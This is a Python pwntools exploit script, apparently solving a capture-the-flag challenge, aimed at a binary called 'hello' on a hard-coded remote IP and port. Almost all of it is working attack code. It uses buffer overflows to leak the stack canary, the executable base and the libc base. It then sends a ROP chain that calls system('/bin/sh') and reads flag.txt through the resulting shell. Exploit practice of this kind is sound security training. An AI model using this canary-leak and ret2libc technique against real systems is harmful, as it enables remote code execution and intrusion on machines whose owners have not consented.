#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import pwn

pwn.context.arch = 'amd64'
pwn.context.os = 'linux'

exe = 'hello'

elf = pwn.ELF(exe)
libc = elf.libc
# print(libc)
off_main = elf.symbols[b'main']
# print(off_main)
base = 0
qemu_base = 0

# Sends a payload to a remote server to leak the canary value.
def leak_canary(p):
    p.recvuntil(b'choice:\n')
    p.send(b'1\n')
    p.recvuntil(b'> ')
    
    offset = 0x28
    payload = b'A' * offset + b'\n'
    p.send(payload)
    
    raw = p.recv()
    canary = raw.split(b'to ')[1].split(b' (')[0].split(b'\n')[1][:7].rjust(8, b'\x00')
    
    p.send(b'n')
    p.recvuntil(b'> ')
    
    return canary

# leak the base address of the executable.
def leak_base_address(p, offset):
    payload = b'A' * (offset + 0xf) + b'\n'
    p.send(payload)
    
    raw = p.recv()
    ret = pwn.u64(raw.split(b'to ')[1].split(b' (')[0].split(b'\n')[1].ljust(8, b'\x00'))
    
    elf.address = ret - off_main - 153
    
    p.send(b'n')
    p.recvuntil(b'> ')
    
    return elf.address

# leak the address of the libc library.
def leak_libc_address(p):
    LIBC_OFFSET = 0x29d90
    
    payload = pwn.flat(
        b'A' * 0x57,
        b'\n',
    )
    
    p.send(payload)
    raw = p.recv()
    leak = pwn.u64(raw.split(b'to ')[1].split(b' (Y/N')[0].split(b'\n')[1].ljust(8, b'\x00'))
    libc.address = leak - LIBC_OFFSET
    
    p.send(b'n')
    p.recvuntil(b'> ')
    
    return libc.address

def exploit(p, canary, elf_address, libc_address):
    RET = elf_address + 0x101a
    POPRDI = libc_address + 0x2a3e5
    
    payload = pwn.flat(
        b'\x00' * 0x28,
        canary,
        b'B' * 8,
        pwn.p64(POPRDI).ljust(8, b'\x00'),
        next(libc.search(b'/bin/sh\x00')),
        pwn.p64(RET).ljust(8, b'\x00'),
        pwn.p64(libc.sym['system']),
    )
    
    p.send(payload)
    p.recvuntil(b')')
    p.send(b'y')
    p.recvuntil(b'Name changed!\n')
    p.send(b'cat flag.txt\n')
    print(p.recv().decode())
    
    
def remote(ip, port):
    offset = 0x28
    p = pwn.remote(ip, port)
    canary = leak_canary(p)
    elf_address = leak_base_address(p, offset)
    libc_address = leak_libc_address(p)
    exploit(p, canary, elf_address, libc_address)

if __name__ == "__main__":
    remote('140.113.24.241', 30174)
